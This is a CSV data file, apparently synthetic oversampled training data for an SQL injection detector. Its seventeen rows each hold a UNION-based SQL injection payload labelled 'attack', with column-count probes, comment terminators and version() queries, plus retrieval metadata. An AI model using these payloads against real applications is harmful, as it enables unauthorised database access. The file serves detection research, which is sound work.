id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,union,1  )   where 9446  =  9446 union all select null#,nearest_attack_euclidean,R001436,0.2707736482825347
SMOTE_000002,attack,union,"1'  )   where 5276  =  5276 union all select null,null--",nearest_attack_euclidean,R001258,0.4145970784630955
SMOTE_000003,attack,union,"-2889   )    )    as iqzv where 1786  =  1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--",nearest_attack_euclidean,R000772,0.21968263558032153
SMOTE_000004,attack,union,"1""  )   where 3084  =  3084 union all select null,null--",nearest_attack_euclidean,R001168,0.22581722488374106
SMOTE_000005,attack,union,"1'||  (  select 'yaii' from dual where 7317  =  7317 union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000642,0.056638697110392516
SMOTE_000006,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000439,0.2469791379538502
SMOTE_000007,attack,union,"-3037  )   where 9024  =  9024 union all select 9024,9024--",nearest_attack_euclidean,R000491,0.23787679203845744
SMOTE_000008,attack,union,-1641' union all select 4835#,nearest_attack_euclidean,R000995,0.2860456485015174
SMOTE_000009,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000049,0.19451452403195382
SMOTE_000010,attack,union,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",nearest_attack_euclidean,R001238,0.2301862040764569
SMOTE_000011,attack,union," select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000059,0.21533851893934725
SMOTE_000012,attack,union,"-4305  )   as ldrt where 2567  =  2567 union all select 2567,2567,2567,2567,2567,2567,2567#",nearest_attack_euclidean,R000668,0.06865024790677551
SMOTE_000013,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R001222,0.11688258559693471
SMOTE_000014,attack,union,"1%""   )    )     )   union all select null,null,null#",nearest_attack_euclidean,R000445,0.10700262130669594
SMOTE_000015,attack,union,1  )   as ratg where 3033  =  3033 union all select null--,nearest_attack_euclidean,R000657,0.15153808862975857
SMOTE_000016,attack,union,"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",nearest_attack_euclidean,R000341,0.03216262571019538
SMOTE_000017,attack,union,"1'  )   as ohnu where 4097  =  4097 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001267,0.3393628754742254
